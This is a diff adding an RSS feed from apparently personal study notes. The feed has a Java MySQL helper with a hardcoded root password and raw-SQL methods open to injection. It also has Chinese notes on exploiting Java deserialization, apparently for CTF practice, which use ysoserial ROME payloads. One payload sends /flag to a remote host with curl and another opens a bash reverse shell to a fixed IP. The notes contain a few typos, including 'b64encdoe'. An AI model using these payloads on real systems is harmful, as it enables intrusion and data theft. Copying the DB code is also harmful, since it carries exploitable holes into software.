@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Java on Alex lan</title><link>http://localhost:1313/tags/java/</link><description>Recent content in Java on Alex lan</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/java/index.xml" rel="self" type="application/rss+xml"/><item><title>Java_mysql</title><link>http://localhost:1313/docs/code/java_mysql/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/code/java_mysql/</guid><description>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> cn.utils;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.sql.*;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">DBconn&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> String url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;jdbc:mysql://localhost:3306/test&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> String name&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;root&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> String pwd&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;123456&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> Connection conn&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> ResultSet rs&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> PreparedStatement ps&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">init&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>{Class.&lt;span style="color:#a6e22e">forName&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mysql.cj.jdbc.Driver&amp;#34;&lt;/span>);}&lt;span style="color:#66d9ef">catch&lt;/span> (Exception e){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;加载失败&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e.&lt;span style="color:#a6e22e">printStackTrace&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn &lt;span style="color:#f92672">=&lt;/span> DriverManager.&lt;span style="color:#a6e22e">getConnection&lt;/span>(url,name,pwd);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (Exception e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;init [SQL驱动程序初始化失败！]&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e.&lt;span style="color:#a6e22e">printStackTrace&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> ResultSet &lt;span style="color:#a6e22e">SelectSql&lt;/span>(String sql) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(sql);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ps &lt;span style="color:#f92672">=&lt;/span> conn.&lt;span style="color:#a6e22e">prepareStatement&lt;/span>(sql);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rs &lt;span style="color:#f92672">=&lt;/span> ps.&lt;span style="color:#a6e22e">executeQuery&lt;/span>(sql);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (SQLException e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;sql数据库查询异常&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e.&lt;span style="color:#a6e22e">printStackTrace&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> rs;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">addUpdDel&lt;/span>(String sql) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PreparedStatement ps &lt;span style="color:#f92672">=&lt;/span> conn.&lt;span style="color:#a6e22e">prepareStatement&lt;/span>(sql);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> i &lt;span style="color:#f92672">=&lt;/span> ps.&lt;span style="color:#a6e22e">executeUpdate&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (SQLException e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;sql数据库增删改异常&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e.&lt;span style="color:#a6e22e">printStackTrace&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> i;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">closeConn&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn.&lt;span style="color:#a6e22e">close&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (SQLException e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;sql数据库关闭异常&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e.&lt;span style="color:#a6e22e">printStackTrace&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>反序列化</title><link>http://localhost:1313/docs/network-security/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid><description>&lt;p>分析序列化后的字符串&lt;/p>
+&lt;p>例子&lt;/p>
+&lt;pre tabindex="0">&lt;code>Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu
+&lt;/code>&lt;/pre>&lt;p>作为序列化的标志参考:&lt;/p>
+&lt;p>一段数据以rO0AB开头，你基本可以确定这串就是Java序列化base64加密的数据。&lt;/p>
+&lt;p>或者如果以aced开头，那么他就是这一段Java序列化的16进制。&lt;/p>
+&lt;h3 id="java-deserialization-scanner">
+ java Deserialization Scanner
+ &lt;a class="anchor" href="#java-deserialization-scanner">#&lt;/a>
+&lt;/h3>
+&lt;p>这个工具在burp插件里面有，去下载一下，记得初始化插件&lt;/p>
+&lt;p>选中发送到插件里（选中右键-&amp;gt;拓展-&amp;gt;Deserialization-&amp;gt;Send request to DS Manual testing）&lt;/p>
+&lt;p>在Manual Tetsing中用§包裹住字串，不要包裹Brerer&lt;/p>
+&lt;p>下面选择Encode useing Base64，add添加，再选择Encode useing Base64，Attack&lt;/p>
+&lt;p>等待一会，会有提示需要1-3minutes&lt;/p>
+&lt;p>&lt;img src="C:%5cUsers%5cjinchuan%5cOneDrive%5cnotes%5c%e7%bd%91%e5%ae%89%5cjava%5cassets%5cimage-20221229181834551.png" alt="image-20221229181834551" />&lt;/p>
+&lt;p>ROME&lt;/p>
+&lt;p>之后用ysoserial 里的MORE&lt;/p>
+&lt;p>&lt;a href="https://github.com/frohoff/ysoserial">GitHub - frohoff/ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.&lt;/a>&lt;/p>
+&lt;pre tabindex="0">&lt;code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME &amp;#34;curl http://vps:10189 -d @/flag&amp;#34; &amp;gt; a.bin
+&lt;/code>&lt;/pre>&lt;p>base64编码&lt;/p>
+&lt;pre tabindex="0">&lt;code>import base64
+with open(&amp;#39;a.bin&amp;#39;,&amp;#39;rb&amp;#39;)as f:
+	b=f.read()
+print(base64.b64encdoe(b))
+&lt;/code>&lt;/pre>&lt;p>放到会执行反序列化的地方取请求,触发命令执行&lt;/p>
+&lt;p>也可以直接shell&lt;/p>
+&lt;pre tabindex="0">&lt;code>bash -i &amp;gt;&amp;amp; /dev/tcp/111.111.111.111/7015 0&amp;gt;&amp;amp;1
+进行base64编码，YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx
+
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME &amp;#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx}|{base64,-d}|{bash,-i}&amp;#34; &amp;gt; a.bin
+&lt;/code>&lt;/pre>&lt;p>同上base64编码，记得在前面带上Beaere&lt;/p></description></item></channel></rss>
